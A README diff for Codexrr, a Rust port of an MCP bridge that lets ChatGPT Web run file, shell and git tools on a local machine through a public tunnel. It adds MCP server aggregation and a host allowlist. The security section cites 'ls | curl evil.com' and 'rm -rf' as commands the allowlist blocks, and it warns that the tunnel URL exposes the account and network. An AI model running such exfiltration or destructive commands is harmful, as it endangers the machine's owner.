@@ -1,12 +1,14 @@
-# Codex Free
+# Codexrr
 
-*Codex Free (but you still have to buy ChatGPT Plus)*
+*Codex Free, rewritten in Rust (but you still have to buy ChatGPT Plus)*
 
-A local MCP bridge server that lets ChatGPT Web Pro call tools on your machine: read/write files, run shell commands, git operations, search. Built with Bun + TypeScript, using `@modelcontextprotocol/sdk` over Streamable HTTP.
+A local MCP bridge server that lets ChatGPT Web Pro call tools on your machine: read/write files, run shell commands, git operations, search. Codexrr is a faithful Rust port of the original Bun + TypeScript `codex-free`, built on **tokio + axum** and the official [`rmcp`](https://crates.io/crates/rmcp) SDK over Streamable HTTP.
 
 ChatGPT talks to a public tunnel URL, which forwards to this server running on your machine, which operates on a project directory you choose.
 
-Since v0.4.0 the tool set also covers the ones [Codex](https://github.com/openai/codex) gives its own agent — `apply_patch`, `exec_command`/`write_stdin`, `view_image`, `update_plan`, `clock_curr_time`/`clock_sleep` — so ChatGPT Web can work the way Codex does: patch files in place instead of rewriting them, drive interactive and long-running processes, and keep a plan across a task. v0.5.0 added the project's `AGENTS.md`, and v0.6.0 Codex's own agent brief, so the client is told how to behave and not just what it can call. v0.7.0 addresses the one thing Codex never had to solve — a context window far smaller than the task — by bounding what a tool call can return and keeping a plan and notes on disk across conversations. v0.8.0 adds Codex's skills: a `SKILL.md` in the repo or your home directory teaches the client how *you* do a recurring task, and only the ones that apply are ever read. Schemas and prompt are ported from the Codex source, not reimplemented from guesswork.
+The tool set covers the ones [Codex](https://github.com/openai/codex) gives its own agent — `apply_patch`, `exec_command`/`write_stdin`, `view_image`, `update_plan`, `clock_curr_time`/`clock_sleep` — so ChatGPT Web can work the way Codex does: patch files in place instead of rewriting them, drive interactive and long-running processes, and keep a plan across a task. It carries the project's `AGENTS.md` and Codex's own agent brief, so the client is told how to behave and not just what it can call. It bounds what a tool call can return and keeps a plan and notes on disk across conversations, addressing the one thing Codex never had to solve — a context window far smaller than the task. And it loads Codex's skills: a `SKILL.md` in the repo or your home directory teaches the client how *you* do a recurring task, and only the ones that apply are ever read. Schemas and prompt are ported from the Codex source, not reimplemented from guesswork.
+
+Beyond the port, Codexrr can **aggregate other MCP servers** — connecting to your local stdio MCP servers and re-exposing their tools through its own endpoint, so the ChatGPT-side agent can call them too.
 
 ## Architecture
 
@@ -14,7 +16,7 @@ Since v0.4.0 the tool set also covers the ones [Codex](https://github.com/openai
 flowchart LR
     ChatGPT["ChatGPT Web Pro"]
     Tunnel["Public Tunnel\n(ngrok / cloudflared)"]
-    Server["Codex Free\nMCP Bridge\n:3000"]
+    Server["Codexrr\nMCP Bridge\n:3000"]
     Tools["Tool Registry"]
 
     FS["read_file\nwrite_file\nlist_directory\ntree"]
@@ -27,9 +29,11 @@ flowchart LR
     Env["get_agent_brief\nget_environment\nget_project_doc"]
     Mem["remember\nrecall"]
     Skills["skills_list\nskills_read"]
+    Bridge["MCP aggregator\n(bridge.rs)"]
     WorkDir[("Project\nDirectory")]
     State[("~/.codex-free\nmemory.json")]
-    SkillDirs[(".agents/skills\n.codex/skills")]
+    SkillDirs[(".agents/skills\n.codex/skills\n.claude/skills")]
+    Upstream[("Upstream MCP\nservers (stdio)")]
 
     ChatGPT -- "HTTPS" --> Tunnel
     Tunnel -- "HTTP\n/mcp" --> Server
@@ -45,27 +49,38 @@ flowchart LR
     Tools --> Env
     Tools --> Mem
     Tools --> Skills
+    Tools --> Bridge
 
     FS --> WorkDir
     Search --> WorkDir
     Shell --> WorkDir
-    Git --> WorkDir
     Edit --> WorkDir
     Exec --> WorkDir
     Agent --> WorkDir
     Env --> WorkDir
     Mem --> State
     Skills --> SkillDirs
+    Bridge --> Upstream
 ```
 
 ## Quick start
 
 ```bash
-bun install
-bun run main.ts --work-dir /path/to/your/project
+cargo run --release -- --work-dir /path/to/your/project
 ```
 
-Server starts on `http://localhost:3000`. MCP endpoint is `/mcp`.
+Server starts on `http://localhost:3000`. The MCP endpoint is `/mcp`; a health check is at `/health`.
+
+To build a standalone binary:
+
+```bash
+cargo build --release
+./target/release/codexrr --work-dir /path/to/your/project
+```
+
+### Prebuilt binaries
+
+Each release ships a compiled binary per platform — `windows-x64`, `linux-x64`, `linux-arm64`, `darwin-x64` and `darwin-arm64`. Download the archive for your OS/arch, unpack it, and run `codexrr --work-dir …`. These are native builds, so there is no AVX2/baseline caveat: the binary runs on any CPU of its architecture.
 
 ## CLI flags
 
@@ -74,7 +89,7 @@ Server starts on `http://localhost:3000`. MCP endpoint is `/mcp`.
 | `--work-dir` | Yes | - | Project directory the tools operate on |
 | `--port` | No | `3000` | Server port |
 | `--api-key` | No | - | Bearer token for auth |
-| `--config` | No | `./codex.config.json` | Config file path |
+| `--config` | No | `./codex.config.json` | Config file path (tolerated if missing) |
 
 ## Tools
 
@@ -89,12 +104,12 @@ Structured primitives — cheaper and safer than shelling out for the same job, 
 | `git_push` | Push commits to a remote |
 | `git_commit` | Create a commit, optionally staging all tracked changes |
 | `git_log` | Show recent commit history |
-| `glob` | Find files matching a glob pattern |
-| `grep` | Search file contents by regex, with optional context lines |
+| `glob` | Find files matching a glob pattern (`.gitignore`-aware) |
+| `grep` | Search file contents by regex, with optional context lines (`.gitignore`-aware) |
 | `list_directory` | List files and directories with name, type, and size |
 | `tree` | Print directory tree as ASCII art |
 
-Ported from Codex (`codex-rs/core/src/tools` at commit `2230d64`, `codex-rs/ext/skills` at `902bd9e`):
+Ported from Codex's own agent tools:
 
 | Tool | Codex name | Description |
 |------|------------|-------------|
@@ -120,7 +135,9 @@ Five tools have no Codex counterpart:
 | `remember` | Save one durable note about the task under a short key |
 | `recall` | Return the plan and notes saved by earlier turns or earlier conversations |
 
-Codex needs the first three for none of these reasons: it puts its agent brief in the system prompt, the OS and shell in an `<environment_context>` message, and `AGENTS.md` straight into the prompt, all before the first turn. An MCP server has none of those channels — it can only expose tools — so the same facts are tool calls here as well as part of the server's `instructions`. It needs `remember` and `recall` for the opposite reason: its context is large and its session state lives in the CLI process, whereas the client here is a chat window that loses the conversation. See [Acting as a Codex agent](#acting-as-a-codex-agent), [Shells and the host](#shells-and-the-host), [AGENTS.md](#agentsmd) and [Context and memory](#context-and-memory).
+Codex needs the first three for none of these reasons: it puts its agent brief in the system prompt, the OS and shell in an `<environment_context>` message, and `AGENTS.md` straight into the prompt, all before the first turn. An MCP server has none of those channels — it can only expose tools — so the same facts are tool calls here as well as part of the server's `instructions`. It needs `remember` and `recall` for the opposite reason: its context is large and its session state lives in the CLI process, whereas the client here is a chat window that loses the conversation. See [Context and memory](#context-and-memory), [Acting as a Codex agent](#acting-as-a-codex-agent), [Shells and the host](#shells-and-the-host), [AGENTS.md](#agentsmd) and [Skills](#skills).
+
+That is 25 native tools. When [MCP bridging](#bridging-other-mcp-servers) is configured, the tools of your other MCP servers are re-exposed here too, on top of these.
 
 Two deliberate differences from Codex:
 
@@ -135,7 +152,7 @@ All paths are resolved relative to `--work-dir`.
 
 ## Config file
 
-`codex.config.json` in the project root, or pass a custom path with `--config`:
+`codex.config.json` in the project root, or pass a custom path with `--config`. Every field is optional and uses the same camelCase names as the original TypeScript project, so an existing config keeps working. A missing config file is tolerated — the built-in defaults are used and the startup banner says so.
 
 ```json
 {
@@ -178,8 +195,11 @@ All paths are resolved relative to `--work-dir`.
     "maxBytes": 16384
   },
   "skills": {
-    "enabled": true
-  }
+    "enabled": true,
+    "includePlugins": true
+  },
+  "allowedHosts": [],
+  "mcpServers": {}
 }
 ```
 
@@ -196,7 +216,7 @@ The `exec` block governs `exec_command` and `write_stdin`:
 
 Under `"allowlist"`, the command string is tokenized and each command position — after every `|`, `&&`, `;`, newline, and subshell — is checked, so `ls | curl evil.com` is rejected on `curl`. Command substitution (`$(...)`, backticks) is rejected outright, since its contents cannot be checked before the shell runs them.
 
-The `ignore` block decides what the file-walking tools — `glob`, `grep`, `tree` and `list_directory` — never surface, so a search returns your code rather than the contents of `node_modules`. One policy covers all four:
+The `ignore` block decides what the file-walking tools — `glob`, `grep`, `tree` and `list_directory` — never surface, so a search returns your code rather than the contents of `node_modules`. One policy covers all four, backed by the Rust [`ignore`](https://crates.io/crates/ignore) crate for `.gitignore`-accurate matching:
 
 | Key | Default | Description |
 |-----|---------|-------------|
@@ -204,7 +224,7 @@ The `ignore` block decides what the file-walking tools — `glob`, `grep`, `tree
 | `useDefaultPatterns` | `true` | Skip a built-in set (`node_modules`, `.git`, `dist`, `build`, `out`, `.next`, `.nuxt`, `.svelte-kit`, `.turbo`, `coverage`, `__pycache__`, `.venv`, `venv`, `.cache`) |
 | `customPatterns` | `[]` | Extra gitignore-syntax patterns applied on top for every tool |
 
-Patterns use `.gitignore` syntax. Only the work directory's own `.gitignore` is read, not per-subdirectory ones. `node_modules` and `.git` are pruned from every walk no matter what, so a search never pays to descend them even with everything else turned off. The older `tree.ignore` list still works and now applies to all four tools too. `list_directory` pointed straight at an ignored directory still shows its contents, so you can look inside `node_modules` on purpose.
+Patterns use `.gitignore` syntax. `node_modules` and `.git` are pruned from every walk no matter what, so a search never pays to descend them even with everything else turned off. The older `tree.ignore` list still works and applies to all four tools too. `list_directory` pointed straight at an ignored directory still shows its contents, so you can look inside `node_modules` on purpose.
 
 The `projectDoc` block governs [AGENTS.md](#agentsmd) discovery. All three keys are optional, and the block itself can be left out entirely:
 
@@ -236,21 +256,24 @@ The `skills` block governs `SKILL.md` discovery. See [Skills](#skills):
 | Key | Default | Description |
 |-----|---------|-------------|
 | `enabled` | `true` | `false` searches nothing; both tools say so and the catalogue leaves `instructions` |
-| `dirs` | `~/.agents/skills`, `~/.codex/skills` | User-scope directories, **replacing** the home-directory defaults. Relative paths resolve against the work directory; project-scope roots are unaffected |
+| `dirs` | `~/.agents/skills`, `~/.codex/skills`, `~/.claude/skills` | User-scope directories, **replacing** the home-directory defaults. Relative paths resolve against the work directory; project-scope roots are unaffected |
+| `includePlugins` | `true` | Discover installed Claude Code plugin skills. Setting `dirs` disables this unless you set it back to `true` |
+
+The `allowedHosts` array and the `mcpServers` map are covered under [Host allowlist](#host-allowlist) and [Bridging other MCP servers](#bridging-other-mcp-servers).
 
 ## Context and memory
 
-Codex runs against a large context window and keeps its session in a process you control. ChatGPT Web does neither: the window is smaller than most real tasks, and when it fills — or when you open a new chat — the plan and everything learned along the way are gone, with no sign to the model that they ever existed. v0.7.0 attacks both halves of that.
+Codex runs against a large context window and keeps its session in a process you control. ChatGPT Web does neither: the window is smaller than most real tasks, and when it fills — or when you open a new chat — the plan and everything learned along the way are gone, with no sign to the model that they ever existed. Codexrr attacks both halves of that.
 
-**Spend the window on less.** Every tool that could return an unbounded amount of text now stops at a budget and says so on its last line, naming the argument that continues from where it stopped:
+**Spend the window on less.** Every tool that could return an unbounded amount of text stops at a budget and says so on its last line, naming the argument that continues from where it stopped:
 
 ```
 (showing lines 1-1000 of 4820 — call again with offset=1000 for the rest)
 ```
 
-That line matters as much as the cap. Silent truncation reads as "that was the whole file", which is worse than no cap at all. `read_file` has a byte ceiling as well as a line one, because a minified bundle is a single line several megabytes long that a line cap alone would hand back in full. `exec_command` and `grep` were already bounded, ported that way from Codex.
+That line matters as much as the cap. Silent truncation reads as "that was the whole file", which is worse than no cap at all. `read_file` has a byte ceiling as well as a line one, because a minified bundle is a single line several megabytes long that a line cap alone would hand back in full. `exec_command` and `grep` are bounded too, ported that way from Codex.
 
-**Keep what would be expensive to rediscover.** `remember` writes one keyed note; `recall` hands back the notes and the current plan. `update_plan` now persists too, so the plan survives the conversation that made it. Writing to a key that exists replaces it, and an empty value deletes it — a keyed store stays current where an append log accumulates contradictions until it is worthless.
+**Keep what would be expensive to rediscover.** `remember` writes one keyed note; `recall` hands back the notes and the current plan. `update_plan` persists too, so the plan survives the conversation that made it. Writing to a key that exists replaces it, and an empty value deletes it — a keyed store stays current where an append log accumulates contradictions until it is worthless.
 
 State lives in `~/.codex-free/projects/<name>-<hash>/memory.json`, keyed by the absolute work directory. Nothing is written into the repository you pointed the server at, and two checkouts of the same repo do not share notes.
 
@@ -260,7 +283,7 @@ The division of labour is worth keeping straight: `AGENTS.md` is what is true of
 
 ## Acting as a Codex agent
 
-A tool list says what a model *can* do; it says nothing about how a careful engineer uses it. Codex closes that gap with a system prompt, and since v0.6.0 so does this bridge — the behavioural half of `codex-rs/core/gpt-5.2-codex_prompt.md` is ported into the server's `instructions`.
+A tool list says what a model *can* do; it says nothing about how a careful engineer uses it. Codex closes that gap with a system prompt, and so does this bridge — the behavioural half of `codex-rs/core/gpt-5.2-codex_prompt.md` is ported into the server's `instructions`.
 
 That brief is what stops the client rewriting a file it never read, reverting your uncommitted work, reaching for `git reset --hard`, or making a one-step plan. It carries Codex's editing constraints (ASCII by default, comments only where they earn their place, `apply_patch` over rewrites, and the dirty-worktree rules in full), its planning rules, its code-review posture, and its habit of reporting back concisely without pasting files you already have on disk.
 
@@ -308,7 +331,7 @@ Because the resolved shell decides what a command should even look like, it is p
 
 ## AGENTS.md
 
-A project's `AGENTS.md` is how it tells an agent its own conventions — which test command to run, which files not to touch, how commits should look. Codex reads it before the first turn; since v0.5.0 so does this bridge, using the same algorithm as `codex-rs/core/src/agents_md.rs`.
+A project's `AGENTS.md` is how it tells an agent its own conventions — which test command to run, which files not to touch, how commits should look. Codex reads it before the first turn; so does this bridge, using the same algorithm as `codex-rs/core/src/agents_md.rs`.
 
 Discovery walks up from `--work-dir` to the nearest directory holding a **root marker** (`.git` by default), then collects **one doc per directory on the way back down**, so a monorepo's root conventions arrive before the ones belonging to the subdirectory you pointed the server at. In each directory, `AGENTS.override.md` wins over `AGENTS.md`, which wins over anything in `projectDoc.fallbackFilenames`. The files are concatenated outermost-first under a **shared 32 KiB budget**, counted in bytes rather than characters; a file that runs past what is left is cut there and reported as truncated, and whitespace-only files are skipped without spending any of it. If no marker is found anywhere above, only the work directory itself is checked.
 
@@ -321,7 +344,7 @@ Instructions are built per MCP session, so editing `AGENTS.md` takes effect on t
 
 ## Skills
 
-`AGENTS.md` says what is true of the project always. A **skill** says how to do one recurring task well — cut a release, review a PR the way this team reviews PRs, debug the flaky suite — and is only read when that task comes up. Codex has had them since its extension crate landed; v0.8.0 ports the format and the discovery, from `codex-rs/ext/skills` and `codex-rs/skills`.
+`AGENTS.md` says what is true of the project always. A **skill** says how to do one recurring task well — cut a release, review a PR the way this team reviews PRs, debug the flaky suite — and is only read when that task comes up. Codex has had them since its extension crate landed; Codexrr ports the format and the discovery, from `codex-rs/ext/skills` and `codex-rs/skills`.
 
 A skill is a directory holding a `SKILL.md` whose YAML frontmatter names it and says when it applies:
 
@@ -339,8 +362,8 @@ name: release
 description: Cut and publish a release of this project
 ---
 
-1. Check `bun test` and `bunx tsc --noEmit` are clean.
-2. Bump the version in `package.json` and `src/server.ts` together.
+1. Check `cargo test` and `cargo clippy` are clean.
+2. Bump the version in `Cargo.toml`.
 3. Run `scripts/tag.sh`; see `references/versioning.md` for what the tag must look like.
 ```
 
@@ -350,21 +373,83 @@ description: Cut and publish a release of this project
 
 | Scope | Directories |
 |-------|-------------|
-| `repo` | `.agents/skills` and `.codex/skills`, in every directory from the project root down to `--work-dir` |
-| `user` | `~/.agents/skills` and `~/.codex/skills`, or whatever `skills.dirs` names instead |
+| `repo` | `.agents/skills`, `.codex/skills` and `.claude/skills`, in every directory from the project root down to `--work-dir` |
+| `user` | `~/.agents/skills`, `~/.codex/skills` and `~/.claude/skills`, or whatever `skills.dirs` names instead |
+| `plugin` | Installed **Claude Code plugin** skills under `~/.claude/plugins/cache/<marketplace>/<plugin>/<version>/skills/*` |
 
 Repo skills come first, so a project decides how a name behaves inside it; a personal skill of the same name is shadowed and `skills_list` says so rather than merging the two.
 
+**Claude Code plugins.** Codexrr also discovers skills bundled with your installed Claude Code plugins, namespaced `<plugin>:<skill>` (e.g. `idasql:decompiler`) so they never collide with your own. The highest installed version of each plugin is used. Turn this off with `"skills": { "includePlugins": false }`. Setting `skills.dirs` overrides the standalone roots and, by default, disables plugin discovery too — set `includePlugins: true` alongside `dirs` to keep it.
+
 **What the model sees.** The catalogue — a name and a description per skill — goes into `instructions` under a `## Skills` heading, so a chat opens knowing what is available without spending a call to find out. Bodies are not loaded: `skills_read` fetches one only once a skill has actually been chosen. That is the progressive disclosure that makes a large library affordable on a small context window. The section is omitted entirely when nothing is installed.
 
-**Reaching the rest of a package.** Reference files, scripts and assets are read with `skills_read` and the skill's name, passing the file's path as `resource`. `read_file` will not do: it is confined to `--work-dir`, and user-scope skills live in your home directory. Paths inside a skill are relative to the skill's own directory, and a `resource` that tries to leave it is rejected — so the only thing this opens up is the inside of a skill you or the project deliberately installed. Reading a `SKILL.md` lists the package's other files, since the model cannot glob a directory it cannot see.
+**Reaching the rest of a package.** Reference files, scripts and assets are read with `skills_read` and the skill's name, passing the file's path as `resource`. `read_file` will not do: it is confined to `--work-dir`, and user- and plugin-scope skills live in your home directory. Paths inside a skill are relative to the skill's own directory, and a `resource` that tries to leave it is rejected — so the only thing this opens up is the inside of a skill you or the project deliberately installed. Reading a `SKILL.md` lists the package's other files, since the model cannot glob a directory it cannot see.
 
 Discovery runs per MCP session, so adding a skill takes effect on the next connection without restarting the server. Set `skills.enabled` to `false` to turn the whole thing off.
+
+## Bridging other MCP servers
+
+Codexrr can also act as an **MCP aggregator**: it connects to your other local MCP servers as a client, discovers their tools at startup, and re-exposes them through its own `/mcp` endpoint — so the ChatGPT-side agent sees and can call them too.
+
+Add an `mcpServers` section to `codex.config.json` (the standard Claude-Desktop shape). Each entry is a stdio command that Codexrr launches and drives over stdin/stdout:
+
+```json
+{
+  "mcpServers": {
+    "idasql": {
+      "command": "idasql-mcp",
+      "args": ["--stdio"],
+      "env": { "IDA_PATH": "C:/Program Files/IDA" }
+    }
+  }
+}
+```
+
+At startup you'll see, e.g.:
+
+```
+bridged MCP server 'idasql': 12 tool(s)
+Tools loaded (37): 25 native + 12 bridged from upstream MCP servers
+```
+
+Each upstream tool is offered as `<server>__<tool>` (for example `remote_exec__docker_ps`), and calls are forwarded to the upstream verbatim — text, images, structured content and error flags all pass through. An upstream that fails to launch or answer is skipped; it never blocks startup or the native tools.
+
+Every configured server is reported in the startup banner, so a bad path or a failed handshake is never silent:
+
+```
+Upstream MCP servers:
+  remote-exec -> 84 tool(s)
+  idasql      -> FAILED: could not launch 'D:/wrong/path.exe': The system cannot find the path specified. (os error 3)
+```
+
+- `disabled: true` on an entry keeps its config but skips it (shown as `-> disabled`).
+- `tools: ["exec", "machine_list", ...]` limits which upstream tools are bridged (an allow-list on the upstream's own names).
+- Bridged names are sanitised to `[A-Za-z0-9_]` (e.g. `remote_exec__exec`) so function-calling layers that reject hyphens don't drop them.
+- A bridged name that would collide with a native tool is skipped with a warning.
+- `type` may be `"stdio"` (default). Only stdio (command-launched) upstreams are bridged today; `type: "sse"`/`"http"` (or a bare `url`) entries are recognised and reported as `not supported yet` rather than failing the whole config.
+
+If your server doesn't show up, **check the banner first** — the most common cause is a wrong `command` path.
+
+### Gateway mode
+
+Some clients (ChatGPT among them) won't reliably surface a large bridged tool set. **`mode: "gateway"`** collapses a whole server with many tools into a **single** dispatcher tool, plus a generated skill:
+
+```json
+"mcpServers": {
+  "remote-exec": {
+    "command": "D:\\mcphub\\mcp-server-windows-x86_64.exe",
+    "type": "stdio",
+    "mode": "gateway"
+  }
+}
+```
+
+This registers one tool named `remote_exec` taking `{ "function": "<name>", "arguments": { ... } }`, and auto-generates a skill (`skills_read name="remote-exec"`) documenting every function and its argument schema. The agent reads the skill, then calls the one tool — so an 84-tool server shows up as **1 tool + 1 skill** instead of 84 tools. `disabled`, `type`, and `tools` (allow-list) all still apply.
 
 ## Connecting to ChatGPT
 
 1. In ChatGPT, go to **Settings > Security and login** and enable **Developer mode**.
-2. Start the server: `bun run main.ts --work-dir /path/to/your/project`
+2. Start the server: `cargo run --release -- --work-dir /path/to/your/project` (or run the release binary directly).
 3. Expose it with a tunnel (ngrok, Cloudflare Tunnel, etc.):
    ```bash
    ngrok http 3000
@@ -377,20 +462,27 @@ Discovery runs per MCP session, so adding a skill takes effect on the next conne
 
 > ChatGPT Plugins only support OAuth, No Auth, and Mixed. The `--api-key` option is for non-ChatGPT clients or tunnel-level auth. When using ChatGPT, secure access through your tunnel provider instead (e.g. ngrok IP restrictions, Cloudflare Access).
 
+## Host allowlist
+
+By default `allowedHosts` is empty, which accepts any `Host` header — the server works behind a tunnel that presents an arbitrary hostname. Set it to a list of hostnames to enable **DNS-rebinding protection**: only requests whose `Host` header matches are served. Leave it empty for the common tunnel case; set it when the server is reachable on a host you control and want to pin.
+
 ## Security
 
 - **Path traversal prevention**: every filesystem tool — including `apply_patch` and `view_image` — resolves paths through a guard that rejects anything outside `--work-dir`.
 - **One bounded exception**: [AGENTS.md](#agentsmd) discovery reads above `--work-dir`, up to the nearest `.git`. Nothing else does. It is read-only, opens only `AGENTS.override.md`, `AGENTS.md` and any `projectDoc.fallbackFilenames`, and `get_project_doc` reports the absolute path of every file it used. Set `projectDoc.maxBytes` to `0` to switch it off, or `projectDoc.rootMarkers` to `[]` to keep the search inside the work directory.
 - **One bounded write outside the work directory**: `remember` and `update_plan` write `memory.json` under `~/.codex-free/`, deliberately outside the repository so nothing lands in your git history. It holds whatever the model chose to note about the task — read it if you want to know, delete the directory to forget, or set `memory.enabled` to `false` to never write it. The write is atomic (temp file plus rename) and guarded by a per-project lock, so a crash mid-write never leaves a torn file and two servers pointed at the same work directory do not lose each other's notes to an interleaved update. See [Context and memory](#context-and-memory).
-- **One bounded read outside the work directory**: [skills](#skills) may live in `~/.agents/skills` or `~/.codex/skills`. `skills_read` opens files there, but only inside a skill package that already exists — the `resource` path is checked against the skill's own directory, so it cannot walk out into the rest of your home directory. `skills_list` reports the absolute path of every skill it found. Set `skills.enabled` to `false` to switch it off, or `skills.dirs` to point the user scope somewhere you choose.
+- **Bounded reads outside the work directory**: [skills](#skills) may live in `~/.agents/skills`, `~/.codex/skills`, `~/.claude/skills` or an installed Claude Code plugin. `skills_read` opens files there, but only inside a skill package that already exists — the `resource` path is checked against the skill's own directory, so it cannot walk out into the rest of your home directory. `skills_list` reports the absolute path of every skill it found. Set `skills.enabled` to `false` to switch it off, or `skills.dirs` to point the user scope somewhere you choose.
 - **Command allowlist**: `run_command` only runs binaries listed in `allowedCommands`; everything else is rejected. `exec_command` checks the same list plus `exec.extraAllowedCommands`, at every command position in the string.
+- **Bridged servers run with your privileges**: an `mcpServers` entry launches a real process on your machine and forwards the model's calls to it verbatim. Only bridge servers you trust, and prefer `tools` allow-lists or `gateway` mode to keep the exposed surface small. A bad `command` path is reported, never silently ignored.
 - **Optional bearer token auth**: set `--api-key` to require an `Authorization: Bearer <key>` header on all requests (except `/health`). Useful for non-ChatGPT clients. ChatGPT Plugins do not support simple bearer token auth.
+- **Host allowlist**: set `allowedHosts` to pin the accepted `Host` header for DNS-rebinding protection. See [Host allowlist](#host-allowlist).
 
-The allowlist is a **guardrail against accidents, not a sandbox**. It catches a model reaching for `curl` or `rm -rf`; it does not contain a determined one. The defaults already include `node`, `python` and `bun`, each of which runs arbitrary code — `node -e "..."` can do anything the server process can. Shell redirection can also write outside the work directory even though the command's cwd is confined to it. Treat everything below as reachable by whoever holds the tunnel URL:
+The allowlist is a **guardrail against accidents, not a sandbox**. It catches a model reaching for `curl` or `rm -rf`; it does not contain a determined one. The defaults already include `node`, `python` and `cargo`, each of which runs arbitrary code — `node -e "..."` can do anything the server process can. Shell redirection can also write outside the work directory even though the command's cwd is confined to it. Treat everything below as reachable by whoever holds the tunnel URL:
 
 - everything in `--work-dir`, read and write
 - anything else the user account running the server can touch, via an allowlisted interpreter
 - the network, from your machine
+- anything a bridged MCP server can do
 
 `exec_command` sessions that outlive a request are killed when the MCP session closes, and the kill takes the children with it: `taskkill /T /F` walks the process tree on Windows, and on POSIX each session gets its own process group that is signalled as a whole. A process that deliberately re-parents or daemonises itself still escapes, so check for strays if a run leaves something listening.
 
@@ -399,10 +491,14 @@ Don't expose this without tunnel-level access control (ngrok IP restrictions, Cl
 ## Dev commands
 
 ```bash
-bun run dev        # watch mode
-bun test           # tests
-bunx tsc --noEmit  # type check
+cargo run -- --work-dir /path/to/project   # run against a project
+cargo build --release                       # optimized binary at target/release/codexrr
+cargo test                                  # run the test suite
+cargo clippy --all-targets                  # lints
+cargo fmt                                    # format
 ```
+
+The design and module layout are documented in [docs/ARCHITECTURE.md](docs/ARCHITECTURE.md).
 
 ## License
 
